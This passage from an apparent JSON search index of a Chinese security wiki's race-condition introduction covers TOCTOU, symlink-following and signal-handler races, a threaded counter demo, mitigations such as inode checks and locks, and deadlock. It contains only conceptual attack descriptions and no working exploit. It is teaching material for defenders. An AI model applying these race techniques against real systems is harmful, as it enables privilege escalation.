\u5e76\u53d1\uff0c\u5373\u81f3\u5c11\u5b58\u5728\u4e24\u4e2a\u5e76\u53d1\u6267\u884c\u6d41\u3002\u8fd9\u91cc\u7684\u6267\u884c\u6d41\u5305\u62ec\u7ebf\u7a0b\uff0c\u8fdb\u7a0b\uff0c\u4efb\u52a1\u7b49\u7ea7\u522b\u7684\u6267\u884c\u6d41\u3002  \u5171\u4eab\u5bf9\u8c61\uff0c\u5373\u591a\u4e2a\u5e76\u53d1\u6d41\u4f1a\u8bbf\u95ee\u540c\u4e00\u5bf9\u8c61\u3002 \u5e38\u89c1\u7684\u5171\u4eab\u5bf9\u8c61\u6709\u5171\u4eab\u5185\u5b58\uff0c\u6587\u4ef6\u7cfb\u7edf\uff0c\u4fe1\u53f7\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e9b\u5171\u4eab\u5bf9\u8c61\u662f\u7528\u6765\u4f7f\u5f97\u591a\u4e2a\u7a0b\u5e8f\u6267\u884c\u6d41\u76f8\u4e92\u4ea4\u6d41\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u79f0\u8bbf\u95ee\u5171\u4eab\u5bf9\u8c61\u7684\u4ee3\u7801\u4e3a \u4e34\u754c\u533a \u3002\u5728\u6b63\u5e38\u5199\u4ee3\u7801\u65f6\uff0c\u8fd9\u90e8\u5206\u5e94\u8be5\u52a0\u9501\u3002  \u6539\u53d8\u5bf9\u8c61\uff0c\u5373\u81f3\u5c11\u6709\u4e00\u4e2a\u63a7\u5236\u6d41\u4f1a\u6539\u53d8\u7ade\u4e89\u5bf9\u8c61\u7684\u72b6\u6001\u3002\u56e0\u4e3a\u5982\u679c\u7a0b\u5e8f\u53ea\u662f\u5bf9\u5bf9\u8c61\u8fdb\u884c\u8bfb\u64cd\u4f5c\uff0c\u90a3\u4e48\u5e76\u4e0d\u4f1a\u4ea7\u751f\u6761\u4ef6\u7ade\u4e89\u3002   \u7531\u4e8e\u5728\u5e76\u53d1\u65f6\uff0c\u6267\u884c\u6d41\u7684\u4e0d\u786e\u5b9a\u6027\u5f88\u5927\uff0c\u6761\u4ef6\u7ade\u4e89\u76f8\u5bf9 \u96be\u5bdf\u89c9 \uff0c\u5e76\u4e14\u5728 \u590d\u73b0\u548c\u8c03\u8bd5\u65b9\u9762\u4f1a\u6bd4\u8f83\u56f0\u96be \u3002\u8fd9\u7ed9\u4fee\u590d\u6761\u4ef6\u7ade\u4e89\u4e5f\u5e26\u6765\u4e86\u4e0d\u5c0f\u7684\u56f0\u96be\u3002  \u6761\u4ef6\u7ade\u4e89\u9020\u6210\u7684\u5f71\u54cd\u4e5f\u662f\u591a\u6837\u7684\uff0c\u8f7b\u5219\u7a0b\u5e8f\u5f02\u5e38\u6267\u884c\uff0c\u91cd\u5219\u7a0b\u5e8f\u5d29\u6e83\u3002\u5982\u679c\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u88ab\u653b\u51fb\u8005\u5229\u7528\u7684\u8bdd\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u4f7f\u5f97\u653b\u51fb\u8005\u83b7\u5f97\u76f8\u5e94\u7cfb\u7edf\u7684\u7279\u6743\u3002  \u8fd9\u91cc\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002  #include   pthread.h  #include   stdio.h  int   counter ;  void   * IncreaseCounter ( void   * args )   { \n   counter   +=   1 ; \n   sleep ( 0.1 ); \n   printf ( Thread %d has counter value %d \\n ,   ( unsigned   int ) pthread_self (), \n          counter );  }  int   main ()   { \n   pthread_t   p [ 10 ]; \n   for   ( int   i   =   0 ;   i     10 ;   ++ i )   { \n     pthread_create ( p [ i ],   NULL ,   IncreaseCounter ,   NULL ); \n   } \n   for   ( int   i   =   0 ;   i     10 ;   ++ i )   { \n     pthread_join ( p [ i ],   NULL ); \n   } \n   return   0 ;  }   \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u80fd\u5e0c\u671b\u6309\u5982\u4e0b\u65b9\u5f0f\u8f93\u51fa  \u279c  005race_condition ./example1\nThread  1859024640  has counter value  1 \nThread  1841583872  has counter value  2 \nThread  1832863488  has counter value  3 \nThread  1824143104  has counter value  4 \nThread  1744828160  has counter value  5 \nThread  1736107776  has counter value  6 \nThread  1727387392  has counter value  7 \nThread  1850304256  has counter value  8 \nThread  1709946624  has counter value  9 \nThread  1718667008  has counter value  10   \u4f46\u662f\uff0c\u7531\u4e8e\u6761\u4ef6\u7ade\u4e89\u7684\u5b58\u5728\uff0c\u6700\u540e\u8f93\u51fa\u7684\u7ed3\u679c\u5f80\u5f80\u4e0d\u5c3d\u4eba\u610f  \u279c    005 race_condition   . / example1                            Thread   1417475840   has   counter   value   2  Thread   1408755456   has   counter   value   2  Thread   1391314688   has   counter   value   8  Thread   1356433152   has   counter   value   8  Thread   1365153536   has   counter   value   8  Thread   1373873920   has   counter   value   8  Thread   1382594304   has   counter   value   8  Thread   1400035072   has   counter   value   8  Thread   1275066112   has   counter   value   9  Thread   1266345728   has   counter   value   10   \u4ed4\u7ec6\u601d\u8003\u4e00\u4e0b\u6761\u4ef6\u7ade\u4e89\u4e3a\u4ec0\u4e48\u53ef\u80fd\u4f1a\u53d1\u751f\u5462\uff1f\u4ee5\u4e0b\u9762\u7684\u4e3a\u5177\u4f53\u7684\u4f8b\u5b50   \u7a0b\u5e8f\u9996\u5148\u6267\u884c\u4e86action1\uff0c\u7136\u540e\u6267\u884c\u4e86action2\u3002\u5176\u4e2d action \u53ef\u80fd\u662f\u5e94\u7528\u7ea7\u522b\u7684\uff0c\u4e5f\u53ef\u80fd\u662f\u64cd\u4f5c\u7cfb\u7edf\u7ea7\u522b\u7684\u3002\u6b63\u5e38\u6765\u8bf4\uff0c\u6211\u4eec\u5e0c\u671b\u7a0b\u5e8f\u5728\u6267\u884c action2 \u65f6\uff0caction1 \u6240\u4ea7\u751f\u7684\u6761\u4ef6\u4ecd\u7136\u662f\u6ee1\u8db3\u7684\u3002  \u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u7684\u5e76\u53d1\u6027\uff0c\u653b\u51fb\u8005\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u5728 action2 \u6267\u884c\u4e4b\u524d\u7684\u8fd9\u4e2a\u77ed\u6682\u7684\u65f6\u95f4\u7a97\u53e3\u4e2d\u7834\u574f action1 \u6240\u4ea7\u751f\u7684\u6761\u4ef6\u3002\u8fd9\u65f6\u5019\u653b\u51fb\u8005\u7684\u64cd\u4f5c\u4e0e action2 \u4ea7\u751f\u4e86\u6761\u4ef6\u7ade\u4e89\uff0c\u6240\u4ee5\u53ef\u80fd\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u7684\u6267\u884c\u6548\u679c\u3002    \u6240\u4ee5\u6211\u8ba4\u4e3a\u95ee\u9898\u7684\u6839\u6e90\u5728\u4e8e\u7a0b\u5e8f\u5458\u867d\u7136\u5047\u8bbe\u67d0\u4e2a\u6761\u4ef6\u5728\u76f8\u5e94\u65f6\u95f4\u6bb5\u5e94\u8be5\u662f\u6ee1\u8db3\u7684\uff0c\u4f46\u662f\u5f80\u5f80\u6761\u4ef6\u53ef\u80fd\u4f1a\u5728\u8fd9\u4e2a\u5f88\u5c0f\u7684\u65f6\u95f4\u7a97\u53e3\u4e2d\u88ab\u4fee\u6539\u3002 \u867d\u7136\u8fd9\u4e2a\u65f6\u95f4\u7684\u95f4\u9694\u53ef\u80fd\u975e\u5e38\u5c0f\uff0c\u4f46\u662f\u653b\u51fb\u8005\u4ecd\u7136\u53ef\u80fd\u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\uff08\u5982\u8ba1\u7b97\u5bc6\u96c6\u578b\u64cd\u4f5c\uff0cDos\u653b\u51fb\uff09\u4f7f\u5f97\u53d7\u5bb3\u673a\u5668\u7684\u5904\u7406\u901f\u5ea6\u53d8\u5f97\u76f8\u5bf9\u6162\u4e00\u4e9b\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_2", 
            "text": "\u5e38\u89c1\u7684\u6761\u4ef6\u7ade\u4e89\u6709\u4ee5\u4e0b\u5f62\u5f0f\u3002", 
            "title": "\u5f62\u5f0f"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#cwe-367-toctou-race-condition", 
            "text": "", 
            "title": "CWE-367: TOCTOU Race Condition"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_3", 
            "text": "TOCTOC (Time-of-check Time-of-use) \u6307\u7684\u662f\u7a0b\u5e8f\u5728\u4f7f\u7528\u8d44\u6e90\uff08\u53d8\u91cf\uff0c\u5185\u5b58\uff0c\u6587\u4ef6\uff09\u524d\u4f1a\u5bf9\u8fdb\u884c\u68c0\u67e5\uff0c\u4f46\u662f\u5728\u7a0b\u5e8f\u4f7f\u7528\u5bf9\u5e94\u7684\u8d44\u6e90\u524d\uff0c\u8be5\u8d44\u6e90\u5374\u88ab\u4fee\u6539\u4e86\u3002   \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e9b\u66f4\u52a0\u5177\u4f53\u7684\u4f8b\u5b50\u3002", 
            "title": "\u63cf\u8ff0"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#cwe-365-race-condition-in-switch", 
            "text": "\u5f53\u7a0b\u5e8f\u6b63\u5728\u6267\u884c switch \u8bed\u53e5\u65f6\uff0c\u5982\u679c switch \u53d8\u91cf\u7684\u503c\u88ab\u6539\u53d8\uff0c\u90a3\u4e48\u5c31\u53ef\u80fd\u9020\u6210\u4e0d\u53ef\u9884\u77e5\u7684\u884c\u4e3a\u3002\u5c24\u5176\u5728case \u8bed\u53e5\u540e\u4e0d\u5199 break \u8bed\u53e5\u7684\u4ee3\u7801\uff0c\u4e00\u65e6 switch \u53d8\u91cf\u53d1\u751f\u6539\u53d8\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u6539\u53d8\u7a0b\u5e8f\u539f\u6709\u7684\u903b\u8f91\u3002", 
            "title": "CWE-365: Race Condition in Switch"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#cwe-363-race-condition-enabling-link-following", 
            "text": "\u6211\u4eec\u77e5\u9053 Linux \u4e2d\u63d0\u4f9b\u4e86\u4e24\u79cd\u5bf9\u4e8e\u6587\u4ef6\u7684\u547d\u540d\u65b9\u5f0f   \u6587\u4ef6\u8def\u5f84\u540d  \u6587\u4ef6\u63cf\u8ff0\u7b26   \u4f46\u662f\uff0c\u5c06\u8fd9\u4e24\u79cd\u547d\u540d\u89e3\u6790\u5230\u76f8\u5e94\u5bf9\u8c61\u4e0a\u7684\u65b9\u5f0f\u6709\u6240\u4e0d\u540c   \u6587\u4ef6\u8def\u5f84\u540d\u5728\u89e3\u6790\u7684\u65f6\u5019\u662f\u901a\u8fc7\u4f20\u5165\u7684\u8def\u5f84\uff08\u6587\u4ef6\u540d\uff0c\u786c\u94fe\u63a5\uff0c\u8f6f\u8fde\u63a5\uff09 \u95f4\u63a5\u89e3\u6790 \u7684\uff0c\u5176\u4f20\u5165\u7684\u53c2\u6570\u5e76\u4e0d\u662f\u76f8\u5e94\u6587\u4ef6\u7684\u771f\u5b9e\u5730\u5740(inode)\u3002  \u6587\u4ef6\u63cf\u8ff0\u7b26\u901a\u8fc7\u8bbf\u95ee\u76f4\u63a5\u6307\u5411\u6587\u4ef6\u7684\u6307\u9488\u6765\u89e3\u6790\u3002   \u6b63\u662f\u7531\u4e8e\u95f4\u63a5\u6027\uff0c\u4ea7\u751f\u4e86\u4e0a\u9762\u6211\u4eec\u6240\u8bf4\u7684\u65f6\u95f4\u7a97\u53e3\u3002  \u4ee5\u4e0b\u9762\u7684\u4ee3\u7801\u4e3a\u4f8b\u5b50\uff0c\u7a0b\u5e8f\u5728\u8bbf\u95ee\u67d0\u4e2a\u6587\u4ef6\u4e4b\u524d\uff0c\u4f1a\u68c0\u67e5\u662f\u5426\u5b58\u5728\uff0c\u4e4b\u540e\u4f1a\u6253\u5f00\u6587\u4ef6\u7136\u540e\u6267\u884c\u64cd\u4f5c\u3002\u4f46\u662f\u5982\u679c\u5728\u68c0\u67e5\u4e4b\u540e\uff0c\u771f\u6b63\u4f7f\u7528\u6587\u4ef6\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u5c06\u6587\u4ef6\u4fee\u6539\u4e3a\u67d0\u4e2a\u7b26\u53f7\u94fe\u63a5\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c06\u8bbf\u95ee\u9519\u8bef\u7684\u6587\u4ef6\u3002   \u8fd9\u79cd\u6761\u4ef6\u7ade\u4e89\u51fa\u73b0\u7684\u95ee\u9898\u7684\u6839\u6e90\u5728\u4e8e\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u540d\u5b57\u5bf9\u8c61\u7ed1\u5b9a\u7684\u95ee\u9898\u3002\u800c\u4e0b\u9762\u7684\u51fd\u6570\u90fd\u4f1a\u4f7f\u7528\u6587\u4ef6\u540d\u4f5c\u4e3a\u53c2\u6570\uff1aaccess(), open(), creat(), mkdir(), unlink(), rmdir(), chown(), symlink(), link(), rename(), chroot(),\u2026  \u90a3\u8be5\u5982\u4f55\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 fstat \u51fd\u6570\u6765\u8bfb\u53d6\u6587\u4ef6\u7684\u4fe1\u606f\u5e76\u628a\u5b83\u5b58\u5165\u5230stat\u7ed3\u6784\u4f53\u4e2d\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06\u8be5\u4fe1\u606f\u4e0e\u6211\u4eec\u5df2\u77e5\u7684\u4fe1\u606f\u8fdb\u884c\u6bd4\u8f83\u6765\u5224\u65ad\u6211\u4eec\u662f\u5426\u8bfb\u5165\u4e86\u6b63\u786e\u7684\u4fe1\u606f\u3002\u5176\u4e2d\uff0cstat\u7ed3\u6784\u4f53\u4e2d\u7684  st_ino  \u548c  st_dev  \u53d8\u91cf\u53ef\u4ee5\u552f\u4e00\u8868\u793a\u6587\u4ef6   st_ino  \uff0c\u5305\u542b\u4e86\u6587\u4ef6\u7684\u5e8f\u5217\u53f7\uff0c\u5373  i-node  st_dev  \uff0c\u5305\u542b\u4e86\u6587\u4ef6\u5bf9\u5e94\u7684\u8bbe\u5907\u3002", 
            "title": "CWE-363: Race Condition Enabling Link Following"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#cwe-364-signal-handler-race-condition", 
            "text": "", 
            "title": "CWE-364: Signal Handler Race Condition"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_4", 
            "text": "\u6761\u4ef6\u7ade\u4e89\u7ecf\u5e38\u4f1a\u53d1\u751f\u5728\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\uff0c\u8fd9\u662f\u56e0\u4e3a\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u652f\u6301\u5f02\u6b65\u64cd\u4f5c\u3002\u5c24\u5176\u662f\u5f53\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u662f \u4e0d\u53ef\u91cd\u5165 \u7684\u6216\u8005\u72b6\u6001\u654f\u611f\u7684\u65f6\u5019\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u901a\u8fc7\u5229\u7528\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u7684\u6761\u4ef6\u7ade\u4e89\uff0c\u53ef\u80fd\u53ef\u4ee5\u8fbe\u5230\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u548c\u4ee3\u7801\u6267\u884c\u7684\u6548\u679c\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u5728\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u6267\u884c\u4e86free\u64cd\u4f5c\uff0c\u6b64\u65f6\u53c8\u6765\u4e86\u4e00\u4e2a\u4fe1\u53f7\uff0c\u7136\u540e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u5c31\u4f1a\u518d\u6b21\u6267\u884cfree\u64cd\u4f5c\uff0c\u8fd9\u65f6\u5019\u5c31\u4f1a\u51fa\u73b0 double free \u7684\u60c5\u51b5\uff0c\u518d\u7a0d\u5fae\u64cd\u4f5c\u4e00\u4e0b\uff0c\u5c31\u53ef\u80fd\u53ef\u4ee5\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u4e86\u3002  \u4e00\u822c\u6765\u8bf4\uff0c\u4e0e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u6709\u5173\u7684\u5e38\u89c1\u7684\u6761\u4ef6\u7ade\u4e89\u60c5\u51b5\u6709   \u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u548c\u666e\u901a\u7684\u4ee3\u7801\u6bb5\u5171\u4eab\u5168\u5c40\u53d8\u91cf\u548c\u6570\u636e\u6bb5\u3002  \u5728\u4e0d\u540c\u7684\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u5171\u4eab\u72b6\u6001\u3002  \u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u672c\u8eab\u4f7f\u7528\u4e0d\u53ef\u91cd\u5165\u7684\u51fd\u6570\uff0c\u6bd4\u5982 malloc \u548c free \u3002  \u4e00\u4e2a\u4fe1\u53f7\u5904\u7406\u51fd\u6570\u5904\u7406\u591a\u4e2a\u4fe1\u53f7\uff0c\u8fd9\u53ef\u80fd\u4f1a\u8fdb\u800c\u5bfc\u81f4use after free \u548c double free \u6f0f\u6d1e\u3002  \u4f7f\u7528 setjmp \u6216\u8005 longjmp \u7b49\u673a\u5236\u6765\u4f7f\u5f97\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e0d\u80fd\u591f\u8fd4\u56de\u539f\u6765\u7684\u7a0b\u5e8f\u6267\u884c\u6d41\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_5", 
            "text": "\u8fd9\u91cc\u8bf4\u660e\u4e00\u4e0b\u7ebf\u7a0b\u5b89\u5168\u4e0e\u53ef\u91cd\u5165\u7684\u5173\u7cfb\u3002   \u7ebf\u7a0b\u5b89\u5168  \u5373\u8be5\u51fd\u6570\u53ef\u4ee5\u88ab\u591a\u4e2a\u7ebf\u7a0b\u8c03\u7528\uff0c\u800c\u4e0d\u4f1a\u51fa\u73b0\u4efb\u4f55\u95ee\u9898\u3002  \u6761\u4ef6  \u672c\u8eab\u6ca1\u6709\u4efb\u4f55\u5171\u4eab\u8d44\u6e90  \u6709\u5171\u4eab\u8d44\u6e90\uff0c\u9700\u8981\u52a0\u9501\u3002      \u53ef\u91cd\u7528  \u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u88ab\u591a\u4e2a\u5b9e\u4f8b\u53ef\u4ee5\u540c\u65f6\u8fd0\u884c\u5728\u76f8\u540c\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\u3002  \u53ef\u91cd\u5165\u51fd\u6570\u53ef\u4ee5\u88ab\u4e2d\u65ad\uff0c\u5e76\u4e14\u5176\u5b83\u4ee3\u7801\u5728\u8fdb\u5165\u8be5\u51fd\u6570\u65f6\uff0c\u4e0d\u4f1a\u4e22\u5931\u6570\u636e\u7684\u5b8c\u6574\u6027\u3002\u6240\u4ee5\u53ef\u91cd\u5165\u51fd\u6570\u4e00\u5b9a\u662f\u7ebf\u7a0b\u5b89\u5168\u7684\u3002  \u53ef\u91cd\u5165\u5f3a\u8c03\u7684\u662f\u5355\u4e2a\u7ebf\u7a0b\u6267\u884c\u65f6\uff0c\u91cd\u65b0\u8fdb\u5165\u540c\u4e00\u4e2a\u5b50\u7a0b\u5e8f\u4ecd\u7136\u662f\u5b89\u5168\u7684\u3002  \u4e0d\u6ee1\u8db3\u6761\u4ef6  \u51fd\u6570\u4f53\u5185\u4f7f\u7528\u4e86\u9759\u6001\u6570\u636e\u7ed3\u6784\uff0c\u5e76\u4e14\u4e0d\u662f\u5e38\u91cf  \u51fd\u6570\u4f53\u5185\u4f7f\u7528\u4e86malloc \u6216\u8005 free \u51fd\u6570  \u51fd\u6570\u4f7f\u7528\u4e86\u6807\u51c6 IO \u51fd\u6570\u3002  \u8c03\u7528\u7684\u51fd\u6570\u4e0d\u662f\u53ef\u91cd\u5165\u7684\u3002    \u53ef\u91cd\u5165\u51fd\u6570\u4f7f\u7528\u7684\u6240\u6709\u53d8\u91cf\u90fd\u4fdd\u5b58\u5728 \u8c03\u7528\u6808 \u7684\u5f53\u524d \u51fd\u6570\u6808 \uff08frame\uff09\u4e0a\u3002", 
            "title": "\u7ebf\u7a0b\u5b89\u5168\u4e0e\u53ef\u91cd\u5165"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_6", 
            "text": "\u5982\u679c\u60f3\u8981\u6d88\u9664\u6761\u4ef6\u7ade\u4e89\uff0c\u90a3\u4e48\u9996\u8981\u7684\u76ee\u6807\u662f\u627e\u5230\u7ade\u4e89\u7a97\u53e3\uff08race windows\uff09\u3002  \u6240\u8c13\u7ade\u4e89\u7a97\u53e3\uff0c\u5c31\u662f\u8bbf\u95ee\u7ade\u4e89\u5bf9\u8c61\u7684\u4ee3\u7801\u6bb5\uff0c\u8fd9\u7ed9\u653b\u51fb\u8005\u76f8\u5e94\u7684\u673a\u4f1a\u6765\u4fee\u6539\u76f8\u5e94\u7684\u7ade\u4e89\u5bf9\u8c61\u3002  \u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4f7f\u5f97\u51b2\u7a81\u7684\u7ade\u4e89\u7a97\u53e3\u76f8\u4e92\u6392\u65a5\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6d88\u9664\u7ade\u4e89\u6761\u4ef6\u3002", 
            "title": "\u9632\u8303"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_7", 
            "text": "\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u540c\u6b65\u539f\u8bed\u6765\u6d88\u9664\u7ade\u4e89\u6761\u4ef6\u3002\u5e38\u89c1\u7684\u5982\u4e0b   \u9501\u53d8\u91cf  \u901a\u5e38\u4e92\u65a5\u7410\uff0c\u5728\u7b49\u5f85\u671f\u95f4\u653e\u5f03CPU\uff0c\u8fdb\u5165idle\u72b6\u6001\uff0c\u8fc7\u4e00\u6bb5\u65f6\u95f4\u81ea\u52a8\u5c1d\u8bd5\u3002  \u81ea\u65cb\u9501\uff08spinlock\uff09\uff0c\u5728\u7b49\u5f85\u671f\u95f4\u4e0d\u653e\u5f03CPU\uff0c\u4e00\u76f4\u5c1d\u8bd5\u3002    \u6761\u4ef6\u53d8\u91cf  \u6761\u4ef6\u53d8\u91cf\u662f\u7528\u6765\u7b49\u5f85\u800c\u4e0d\u662f\u7528\u6765\u4e0a\u9501\u7684\u3002\u6761\u4ef6\u53d8\u91cf\u7528\u6765\u81ea\u52a8\u963b\u585e\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u76f4\u5230\u67d0\u7279\u6b8a\u60c5\u51b5\u53d1\u751f\u4e3a\u6b62\u3002\u901a\u5e38\u6761\u4ef6\u53d8\u91cf\u548c\u4e92\u65a5\u9501\u540c\u65f6\u4f7f\u7528\u3002     \u4e34\u754c\u533a\u5bf9\u8c61\uff0cCRITICAL_SECTION    \u4fe1\u53f7\u91cf\uff08semaphore\uff09\uff0c\u63a7\u5236\u53ef\u8bbf\u95ee\u67d0\u4e2a\u4e34\u754c\u533a\u7684\u7ebf\u7a0b\u6570\u91cf\uff0c\u4e00\u822c\u6bd41\u5927\u3002   \u7ba1\u9053\uff0c\u6307\u7528\u4e8e\u8fde\u63a5\u4e00\u4e2a\u8bfb\u8fdb\u7a0b\u548c\u4e00\u4e2a\u5199\u8fdb\u7a0b\u4ee5\u5b9e\u73b0\u5b83\u4eec\u4e4b\u95f4\u901a\u4fe1\u7684\u4e00\u4e2a\u5171\u4eab\u6587\u4ef6\u3002\u5176\u751f\u5b58\u671f\u4e0d\u8d85\u8fc7\u521b\u5efa\u7ba1\u9053\u7684\u8fdb\u7a0b\u7684\u751f\u5b58\u671f\u3002  \u547d\u540d\u7ba1\u9053\uff0c\u751f\u5b58\u671f\u53ef\u4ee5\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fd0\u884c\u671f\u4e00\u6837\u957f\u3002   # \u521b\u5efa\u7ba1\u9053\nmkfifo my_pipe\n# gzip\u4ece\u7ed9\u5b9a\u7684\u7ba1\u9053\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u5e76\u628a\u6570\u636e\u538b\u7f29\u5230out.gz\u4e2d\ngzip -9 -c   my_pipe   out.gz  \n# \u7ed9\u7ba1\u9053\u4f20\u8f93\u6570\u636e\ncat file   my_pipe", 
            "title": "\u540c\u6b65\u539f\u8bed"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_8", 
            "text": "", 
            "title": "\u6b7b\u9501"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_9", 
            "text": "\u5f53\u540c\u6b65\u539f\u8bed\u4f7f\u7528\u7684\u4e0d\u6070\u5f53\u7684\u65f6\u5019\uff0c\u8fdb\u7a0b\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0\u6b7b\u9501\u3002\u5f53\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u7684\u6267\u884c\u6d41\u4e92\u76f8\u963b\u585e\u5bfc\u81f4\u90fd\u4e0d\u80fd\u7ee7\u7eed\u6267\u884c\uff0c\u6b7b\u9501\u5c31\u4f1a\u53d1\u751f\u3002\u5176\u5b9e\uff0c\u6b7b\u9501\u4e3b\u8981\u662f\u56e0\u4e3a\u5728\u51b2\u7a81\u7684\u6267\u884c\u6d41\u4e2d\uff0c\u51fa\u73b0\u4e86\u5faa\u73af\u7b49\u5f85\u7684\u6267\u884c\u6d41\uff0c\u5373\u5faa\u73af\u7b49\u5f85\u4e2d\u7684\u6bcf\u4e00\u4e2a\u6267\u884c\u6d41\u90fd\u83b7\u5f97\u4e00\u4e2a\u8d44\u6e90\uff0c\u540c\u65f6\u8bd5\u56fe\u83b7\u5f97\u4e0b\u4e00\u4e2a\u8d44\u6e90\u3002\u4e0b\u56fe\u6240\u793a\uff0cP1\u3001P2 \u4e24\u4e2a\u8fdb\u7a0b\u90fd\u9700\u8981\u8d44\u6e90\u624d\u80fd\u7ee7\u7eed\u8fd0\u884c\u3002P1 \u62e5\u6709\u8d44\u6e90 R2\u3001\u8fd8\u9700\u8981\u989d\u5916\u8d44\u6e90 R1 \u624d\u80fd\u8fd0\u884c\uff1bP2 \u62e5\u6709\u8d44\u6e90 R1\u3001\u8fd8\u9700\u8981\u989d\u5916\u8d44\u6e90 R2 \u624d\u80fd\u8fd0\u884c\uff0c\u4e24\u8fb9\u90fd\u5728\u4e92\u76f8\u7b49\u5f85\u800c\u6ca1\u6709\u4efb\u4f55\u4e00\u4e2a\u53ef\u8fd0\u884c\u3002   \u4e00\u822c\u6765\u8bf4\uff0c\u6b7b\u9501\u6709\u4ee5\u4e0b\u56db\u4e2a\u5fc5\u8981\u6761\u4ef6   \u4e92\u65a5\uff0c\u8d44\u6e90\u662f\u4e92\u65a5\u7684\u3002  \u6301\u6709\u548c\u7b49\u5f85\uff0c\u6301\u6709\u5df2\u6709\u7684\u8d44\u6e90\uff0c\u540c\u65f6\u7b49\u5f85\u4f7f\u7528\u4e0b\u4e00\u4e2a\u8d44\u6e90\u3002  \u4e0d\u53ef\u62a2\u5360\uff0c\u8fdb\u7a0b\u6240\u83b7\u5f97\u7684\u8d44\u6e90\u5728\u672a\u4f7f\u7528\u5b8c\u6bd5\u4e4b\u524d\uff0c\u8d44\u6e90\u7533\u8bf7\u8005\u4e0d\u80fd\u5f3a\u884c\u5730\u4ece\u8d44\u6e90\u5360\u6709\u8005\u624b\u4e2d\u593a\u53d6\u8d44\u6e90\uff0c\u800c\u53ea\u80fd\u7531\u8be5\u8d44\u6e90\u7684\u5360\u6709\u8005\u8fdb\u7a0b\u81ea\u884c\u91ca\u653e\u3002  \u5faa\u73af\u7b49\u5f85\uff0c\u5faa\u73af\u7b49\u5f85\u8d44\u6e90\u3002   \u800c\u5982\u679c\u60f3\u8981\u6d88\u9664\u6b7b\u9501\uff0c\u4e5f\u5c31\u662f\u6253\u7834\u4e0a\u9762\u7684\u56db\u4e2a\u5fc5\u8981\u6761\u4ef6\u3002  \u6b64\u5916\uff0c\u6b7b\u9501\u53ef\u80fd\u6765\u6e90\u4e8e\u4ee5\u4e0b\u7684\u539f\u56e0   \u5904\u7406\u5668\u901f\u5ea6  \u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u8c03\u5ea6\u7b97\u6cd5\u7684\u53d8\u52a8  \u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u540c\u5185\u5b58\u7684\u9650\u5236\u3002  \u4efb\u4f55\u80fd\u591f\u4e2d\u65ad\u7a0b\u5e8f\u6267\u884c\u7684\u5f02\u6b65\u4e8b\u4ef6\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_10", 
            "text": "\u6b7b\u9501\u4e00\u822c\u60c5\u51b5\u4e0b\u4f1a\u9020\u6210\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002", 
            "title": "\u5f71\u54cd"
        }, 
        {
            "location": "/pwn/race-condition/introduction/#_11", 
